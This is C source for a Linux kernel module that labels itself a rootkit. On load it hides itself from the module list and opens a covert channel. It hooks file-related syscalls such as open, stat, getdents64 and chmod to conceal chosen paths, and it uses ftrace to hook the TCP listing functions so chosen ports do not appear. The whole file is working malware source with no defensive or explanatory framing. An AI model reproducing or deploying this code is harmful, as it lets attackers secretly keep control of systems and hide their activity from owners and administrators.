#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/tcp.h>

#include "communicate.h"
#include "hooked_syscalls.h"

#include "hidden_paths.h"
#include "hidden_tcp_ports.h"

#include "hide_module.h"

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Anon");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("rootkit");

// the module parameters
unsigned long kallsyms;
module_param(kallsyms, ulong, S_IRUGO
);
MODULE_PARM_DESC(kallsyms,
"kallsyms_lookup_name(char *path) function address");

unsigned long rootkit_pid;
module_param(rootkit_pid, ulong, S_IRUGO
);
MODULE_PARM_DESC(rootkit_pid,
"process id of the rootkit");


asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

asmlinkage long new_tcp4_seq_show(struct seq_file *seq, void *v) {
    if (v != SEQ_START_TOKEN) {
        struct inet_sock *is = (struct inet_sock *) v;

        if (is_tcp4_port_hidden(ntohs(is->inet_sport))) {
            return 0;
        }

    }

    return orig_tcp4_seq_show(seq, v);
}

asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

asmlinkage long new_tcp6_seq_show(struct seq_file *seq, void *v) {
    if (v != SEQ_START_TOKEN) {
        struct inet_sock *is = (struct inet_sock *) v;

        if (is_tcp6_port_hidden(ntohs(is->inet_sport))) {
            return 0;
        }

    }

    return orig_tcp6_seq_show(seq, v);
}


unsigned long *sys_call_table_addr;

struct syscall_hook_handle *hooks_arr[] = {
        &open_hook,
        &stat_hook,
        &lstat_hook,
        &statx_hook,
        &access_hook,
        &getdents64_hook,
        &openat_hook,
        &chdir_hook,
        &chmod_hook,
        &chown_hook
};

struct ftrace_hook tcp4_hook = HOOK("tcp4_seq_show", new_tcp4_seq_show, &orig_tcp4_seq_show);
struct ftrace_hook tcp6_hook = HOOK("tcp6_seq_show", new_tcp6_seq_show, &orig_tcp6_seq_show);

static int __init rootkit_init(void) {
    // hiding the module
    hide_this_module();

    setup_my_channel();

    // getting syscall table address from kallsyms_lookup_name function
    sys_call_table_addr = (unsigned long *) (*((unsigned long (*)(const char *)) kallsyms))("sys_call_table");

    // hook syscalls
    for (int i = 0; i < ARRAY_SIZE(hooks_arr); i++) {
        hook_syscall(hooks_arr[i], sys_call_table_addr);
    }

    // hook tcp handler function
    fh_install_hook(&tcp4_hook);
    fh_install_hook(&tcp6_hook);

    initialize_hidden_paths_trie();

    return 0;
}

extern struct trie *trie;

void exit_my_module(void) {
    static bool exited = false;
    if (exited)
        return;
    exited = true;

    // unhook syscalls
    for (int i = 0; i < ARRAY_SIZE(hooks_arr); i++) {
        unhook_syscall(hooks_arr[i], sys_call_table_addr);
    }

    // unhook tcp handler function
    fh_remove_hook(&tcp4_hook);
    fh_remove_hook(&tcp6_hook);

    finish_hidden_paths_trie();

    close_my_channel();

    // unhide the module
    unhide_this_module();
}

static void __exit rootkit_exit(void) {
    exit_my_module();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
